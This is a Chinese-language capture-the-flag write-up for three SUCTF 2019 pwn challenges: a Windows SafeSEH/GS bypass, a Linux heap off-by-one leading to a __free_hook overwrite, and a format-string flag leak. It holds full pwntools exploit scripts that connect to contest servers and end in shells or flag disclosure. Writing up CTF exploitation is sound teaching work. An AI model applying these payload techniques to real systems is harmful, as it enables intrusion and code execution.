---
title: SUCTF 2019 
categories:
- SUCTF2019
---
# SUCTF 2019 PWN writeup

## 前言

前几天SuCT的复盘

## BabyStack

### 程序逻辑

main函数给出程序加载地址和栈地址，输入一个栈地址(emm自己试了很久)可以触发异常进入magic函数

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // ebx
  int v4; // edi
  int v5; // esi
  struct _EH3_EXCEPTION_REGISTRATION *v6; // eax
  int v7; // esi
  int v8; // eax
  int v9; // eax
  int v10; // eax
  char v11; // ST38_1
  char v12; // ST34_1
  char v13; // ST30_1
  char v14; // ST2C_1
  char v15; // ST28_1
  char v16; // ST24_1
  char v17; // ST20_1
  char v18; // ST1C_1
  char v19; // ST04_1
  signed int v20; // ecx
  char v21; // dl
  int v23; // [esp-10h] [ebp-40h]
  int v24; // [esp-Ch] [ebp-3Ch]
  int v25; // [esp-8h] [ebp-38h]
  int v26; // [esp-4h] [ebp-34h]
  int v27; // [esp+0h] [ebp-30h]
  int v28; // [esp+4h] [ebp-2Ch]
  __int64 v29; // [esp+8h] [ebp-28h]
  char v30; // [esp+10h] [ebp-20h]
  CPPEH_RECORD ms_exc; // [esp+18h] [ebp-18h]

  ms_exc.registration.TryLevel = -2;
  ms_exc.registration.ScopeTable = (PSCOPETABLE_ENTRY)stru_47ACE0;
  ms_exc.registration.ExceptionHandler = main_func;
  ms_exc.registration.Next = v6;
  v26 = v3;
  v25 = v5;
  v24 = v4;
  ms_exc.old_esp = (DWORD)&v23;
  v29 = 0i64;
  v30 = 0;
  v7 = 0;
  v28 = 0;
  v8 = sub_4038C3(0);
  sub_4022AC(v8, 0);
  v9 = sub_4038C3(1);
  sub_4022AC(v9, 0);
  v10 = sub_4038C3(2);
  sub_4022AC(v10, 0);
  sub_401474((int)"  ____        _            _____ _             _    \n", v11);
  sub_401474((int)" |  _ \\      | |          / ____| |           | |   \n", v12);
  sub_401474((int)" | |_) | __ _| |__  _   _| (___ | |_ __ _  ___| | __\n", v13);
  sub_401474((int)" |  _ < / _` | '_ \\| | | |\\___ \\| __/ _` |/ __| |/ /\n", v14);
  sub_401474((int)" | |_) | (_| | |_) | |_| |____) | || (_| | (__|   < \n", v15);
  sub_401474((int)" |____/ \\__,_|_.__/ \\__, |_____/ \\__\\__,_|\\___|_|\\_\\\n", v16);
  sub_401474((int)"                     __/ |                          \n", v17);
  sub_401474((int)"                    |___/                           \n", v18);
  sub_4037E2("Hello,I will give you some gifts");
  sub_401474((int)"stack address = 0x%X\n", (unsigned int)&v29);
  sub_401474((int)"main address = 0x%X\n", (unsigned int)j_main);
  sub_401474((int)"So,Can You Tell me what did you know?\n", v19);
  ms_exc.registration.TryLevel = 0;
  sub_402482("%s", &v29, 9);
  if ( strlen((const char *)&v29) == 8 )
  {
    v20 = 0;
    while ( 1 )
    {
      v27 = v20;
      if ( v20 >= 8 )
        break;
      v21 = *((_BYTE *)&v29 + v20);
      if ( (unsigned __int8)(v21 - 48) > 9u )
      {
        if ( (unsigned __int8)(v21 - 65) <= 5u )
        {
          v7 = v21 + 16 * v7 - 55;
          v28 = v7;
        }
        ++v20;
      }
      else
      {
        v7 = v21 + 16 * (v7 - 3);
        v28 = v7;
        ++v20;
      }
    }
    sub_401474((int)"You can not find Me!\n", v25);
    sub_403733(0);
  }
  sub_401474((int)"Error!\n", v24);
  sub_403733(0);
  return 1;
}
```
```c
int magic()
{
  char v0; // ST0C_1
  int v1; // eax
  char v2; // ST2C_1
  char v3; // ST0C_1
  char v4; // ST0C_1
  char v5; // ST0C_1
  char v7; // [esp+0h] [ebp-F4h]
  char v8; // [esp+0h] [ebp-F4h]
  int v9; // [esp+18h] [ebp-DCh]
  int v10; // [esp+1Ch] [ebp-D8h]
  signed int i; // [esp+38h] [ebp-BCh]
  char v12; // [esp+48h] [ebp-ACh]
  int v13; // [esp+C8h] [ebp-2Ch]
  int v14; // [esp+CCh] [ebp-28h]
  int v15; // [esp+D0h] [ebp-24h]
  int v16; // [esp+D4h] [ebp-20h]
  CPPEH_RECORD ms_exc; // [esp+DCh] [ebp-18h]

  sub_401E65(&v12, 0, 0x80);
  v13 = 0;
  v14 = 0;
  v15 = 0;
  v16 = 0;
  sub_401474((int)"Oops,You find Me!\n", v7);
  sub_401474((int)"OK,I can tell you something\n", v0);
  ms_exc.registration.TryLevel = 0;
  for ( i = 0; i < 10; ++i )
  {
    sub_401474((int)"Do you want to know more?\n", v8);
    sub_402482("%s", &v12, 8);
    sub_4033E1();
    v10 = strcmp(&v12, "yes");
    if ( v10 )
      v10 = -(v10 < 0) | 1;
    if ( v10 )
    {
      v9 = strcmp(&v12, "no");
      if ( v9 )
        v9 = -(v9 < 0) | 1;
      if ( !v9 )
        break;
      v1 = sub_4038C3(0);
      sub_402C70(&v12, 0x100, v1);              // overflow ebp-0xac
    }
    else
    {
      sub_401474((int)"Where do you want to know?\n", v8);
      sub_402482("%s", &v13, 0x10);
      v2 = sub_4019F6(&v13);
      sub_401474((int)"Address 0x%X value is 0x%X\n", v2);
    }
  }
  ms_exc.registration.TryLevel = -2;
  sub_401474((int)"Now,I will tell you 1 + 1 = 3!\n", v8);
  sub_401474((int)"Oh,no!\n", v3);
  sub_401474((int)"You don't believe 1 + 1 = 3???\n", v4);
  sub_401474((int)"You do calculation like cxk!!!\n", v5);
  return sub_403733(0);
}
```

magic函数中存在后门，由于有SafeSEH的保护，不能直接覆盖SEH到后门地址，每次系统重启，程序加载的地址才会变化，因此一次开机程序的加载地址就固定了，下面的exp都是基于这个写的。

这道题几乎是HITB的原题，在看雪找了篇帖子学习
[看雪](https://bbs.pediy.com/thread-221016.htm)

magic函数存在溢出，我们按照帖子里的分析伪造一个假的scope table以及FilterFunc(和HandleFunc一样都会执行)，泄露出GS、Security Cookie以及GS后面的2个值，SEH NEXT，payload结构如下:
```py
payload = 'a'*4+p32(0xffffffe4)+p32(0)+p32(0xffffff0c)+p32(0)+p32(0xfffffffe)
payload += p32(system_addr)*2
payload = payload.ljust(0xa0,'b')
payload += GS
payload += canary_1
payload += canary2
payload += SEH_NEXT
payload += p32(SEH Handler)
payload += p32(SecurityCookie^(input_addr+4))
```

这里几个比较重要的地址：Security Cookie在0x47c004，GS在ebp-0x1c处，canary_1在ebp-0x18，canary_2在ebp-0x14，canary_3在ebp-0x10处

泄露的地址-0x20为ebp_addr

输入的地址为ebp_addr-0xac

上述地址的推断来自于OD调试，下断点，算偏移即可，例如：

泄露地址为0xb3f8f4，调试可以看到ebp_addr为leak_addr - 0x20 = 0xB3F8D4


![cookie](./1.jpg)

![debug](./2.png)

### exp.py

本地拿看雪师傅的辅助脚本跑失败了，Su那边服务器又关了，这里直接拿17师傅的脚本了，看了下payload结构应该没什么大的出入

```py
from pwn import *

context.log_level = 'debug'

p = remote('121.40.159.66', 6666)

p.recvuntil('stack address = ')
stack_base = p.recvuntil('\r\n', drop=True)
stack_base = int(stack_base, 16)

p.recvuntil('main address = ')
exe_base = p.recvuntil('\r\n', drop=True)
exe_base = int(exe_base, 16)

security = exe_base + (0x47C004 - 0x40395e)

overflow_addr = stack_base - (0xcffaa8 - 0xcff9dc)

p.recvuntil('So,Can You Tell me what did you know?\r\n')

p.send('0x800000\n')

p.sendlineafter('Do you want to know more?\r\n', '1')
p.sendline('aaaa')

p.sendlineafter('Do you want to know more?\r\n', 'yes')
p.sendlineafter('Where do you want to know?\r\n', str(security))
recv = p.recvuntil('value is ')
recv = p.recvuntil('\r\n', drop=True)
security_cookie = int(recv, 16)

print hex(security_cookie)

p.sendlineafter('Do you want to know more?\r\n', 'yes')
p.sendlineafter('Where do you want to know?\r\n', str(stack_base - 0x30))
recv = p.recvuntil('value is ')
recv = p.recvuntil('\r\n', drop=True)
canary = int(recv, 16)

p.sendlineafter('Do you want to know more?\r\n', 'yes')
p.sendlineafter('Where do you want to know?\r\n', str(stack_base - 0x30 - 0xc))
recv = p.recvuntil('value is ')
recv = p.recvuntil('\r\n', drop=True)
canary_1 = int(recv, 16)

p.sendlineafter('Do you want to know more?\r\n', 'yes')
p.sendlineafter('Where do you want to know?\r\n', str(stack_base - 0x30 - 0x8))
recv = p.recvuntil('value is ')
recv = p.recvuntil('\r\n', drop=True)
canary_2 = int(recv, 16)

p.sendlineafter('Do you want to know more?\r\n', 'yes')
p.sendlineafter('Where do you want to know?\r\n', str(stack_base - 0x30 - 0x4))
recv = p.recvuntil('value is ')
recv = p.recvuntil('\r\n', drop=True)
canary_3 = int(recv, 16)

target = exe_base + (0x408266 - 0x40395e)

payload = '\x00' * 0x10 + p32(0xffffffe4) + p32(0) + p32(0xFFFFFF0C) + p32(0) + p32(0xFFFFFFFE) + p32(exe_base + (0x408224 - 0x40395e)) + p32(target)
payload = payload.ljust(0x90, '\x00') + p32(canary_1) + p32(canary_2) + p32(canary_3)
payload += p32(canary) + p32(exe_base + (0x7d9a30 - 0x7d395e)) + p32( (overflow_addr + 0x10) ^ security_cookie  ) + p32(0) + p32(stack_base)

p.sendlineafter('Do you want to know more?\r\n', '1')
p.sendline(payload)

p.interactive()
p.close()

#flag{M4ybe_Saf3_SEH_1s_n0t_S4f3?}
```

## 二手破电脑

### 漏洞利用

漏洞在写Name的时候的sprintf的off-by-one，构造堆块实在是太麻烦了，leak heap和leak libc花了我一天的时间。。最后是用Overlap chunk分配Large bin得到heap地址，自己做这种复杂一点的堆构造真的是太费劲了，思路不够清晰，做了很多无用功.

拿shell的方法是Overlap写一个pc的name_chunk为其本身，同时修改这个pc的size为fake size，从而Rename的时候地址任意写。

![bug](./3.jpg)

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='i386',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./pwn')

if debug:
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    p = process('./pwn')
    gadgets = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]
else:
    gadgets = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    p = remote('47.111.59.243',10001)

def Purchase(size,name,price):
    p.recvuntil('>>> ')
    p.sendline('1')
    p.recvuntil('Name length: ')
    p.sendline(str(size))
    p.recvuntil('Name: ')
    p.send(name)
    p.recvuntil('Price: ')
    p.sendline(str(price))

def Comment(index,comment,score):
    p.recvuntil('>>> ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil(': ')
    p.sendline(comment)
    p.recvuntil('And its score: ')
    p.sendline(str(score))


def Throw(index):
    p.recvuntil('>>> ')
    p.sendline('3')
    p.recvuntil('index: ')
    p.sendline(str(index))

def Rename(index,new_content_1,new_content,isGetPower='y',serial='e4SyD1C!'):
    p.recvuntil('>>> ')
    p.sendline('4')
    p.recvuntil('index: ')
    p.sendline(str(index))
    #
    p.send(new_content_1)
    p.recvuntil('Wanna get more power?(y/n)')
    p.sendline(isGetPower)
    if isGetPower == 'y':
        p.recvuntil('Give me serial: ')
        p.send(serial)
        raw_input()
        p.send('\n')
        p.recvuntil('Hey Pwner')
        gdb.attach(p)
        p.send(new_content)


def exp():
    Purchase(0x10,'a\n',0)#0
    Purchase(0x1fc,'a\n',1)#1
    Purchase(0x10,'a\n',2)#2
    Throw(2)
    Purchase(0x20,'a\n',2)#2
    #Comment(2,'1',2)#2's
    Purchase(0x30,'a\n',3)#3
    Purchase(0xc,'a'*0xc,4)#4
    Throw(0)
    Purchase(0x1fc,'a\n',0)#0
    Purchase(0x28,'a\n',2)#5

    Throw(4)#1
    Purchase(0xc,'a'*0x8+p32(0x2b8),4)#4
    Throw(1)#free a unsorted





    Throw(0)#free another
    #leak heap
    Purchase(0x38+0x10-8,'c\n',0)#0
    Purchase(0x1e8,'d\n',0)#1
    Purchase(0x1f8,'e\n',1)#6
    #comment 3
    p.recvuntil('>>> ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline('3')
    p.recvuntil('Comment on ')
    heap_base = u32(p.recv(4)) - 0x2c8
    log.success('heap base => ' + hex(heap_base))

    p.recvuntil(': ')
    p.sendline('1')
    p.recvuntil('And its score: ')
    p.sendline(str(3))
    #off by one again
    Purchase(0x10,'a\n',7)#7
    Throw(6)
    Throw(7)


    Purchase(0x1f8,'a\n',6)#6


    Throw(1)
    Throw(6)
    Purchase(0x1e0,'e\n',1)#1


    p.recvuntil('>>> ')
    p.sendline('2')
    p.recvuntil('Index: ')
    p.sendline('2')
    p.recvuntil('Comment on ')
    libc_offset = 0x1b2780
    libc_base = u32(p.recv(4)) - 0x30 - libc_offset
    log.success('libc base => ' + hex(libc_base))
    free_hook = libc_base + libc.symbols['__free_hook']
    log.success('free hook addr => ' + hex(free_hook))
    system_addr = libc_base + libc.symbols['system']
    log.success('system addr => ' + hex(system_addr))

    p.recvuntil(': ')
    p.sendline('1')
    p.recvuntil('And its score: ')
    p.sendline(str(3))
    #get shell

    Throw(1)
    Throw(0)
    Throw(4)
    Throw(5)

    Purchase(0x1a0,'/bin/sh\n',0)
    payload = 'a'*0x50+p32(0x200)+p32(0x29)+p32(heap_base+0x280)*2+'a'*0x18+p32(0)+p32(0x29) #set fake size=0x28

    Purchase(0x80,payload+'\n',1)

    Purchase(0x30,p32(0x270)+p32(0x30)+'\n',4)


    Rename(2,p32(free_hook)*2,p32(system_addr)+'\n')


    p.recvuntil('PWNer say goobye gently')


    p.interactive()




exp()

```

## playfmt

### 漏洞利用

简单的bss格式化字符串，flag在堆里，直接泄露即可

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='i386',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./playfmt')

if debug:
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    p = process('./playfmt')
    gadgets = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]
else:
    gadgets = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    p = remote('120.78.192.35',9999)

def exp():
    buf_addr = 0x0804b040

    #leak stack
    p.recvuntil('=====================\n')
    heap_offset = 0x4a28
    p.sendline("%18$p")
    p.recvuntil('0x')
    heap_base = int(p.recvline().strip('\n'),16) - heap_offset
    log.success('heap base => ' + hex(heap_base))
    target_addr = heap_base+heap_offset-0x18
    #leak stack
    p.sendline("%6$p")
    p.recvuntil('0x')
    stack_addr = int(p.recvline().strip('\n'),16)
    log.success("stack addr => " + hex(stack_addr))
    target_stack_addr = stack_addr + 0x10
    #leak flag
    #write addr

    payload = "%"+str(target_stack_addr & 0xffff)+"c"+"%6$hn"
    p.sendline(payload)
    print p.recvline()
    #write var

    #gdb.attach(p,'b* 0x0804889f')
    time.sleep(0.2)
    payload = "%"+str(0x10)+"c"+"%14$hhn"
    p.sendline(payload)
    print p.recvline()
    #leak flag


    payload = "%18$s"
    time.sleep(0.2)
    p.sendline(payload)
    print p.recvline()
    #raw_input()
    p.sendline('%18$s')
    p.sendline('quit')
    p.interactive()
exp()
```

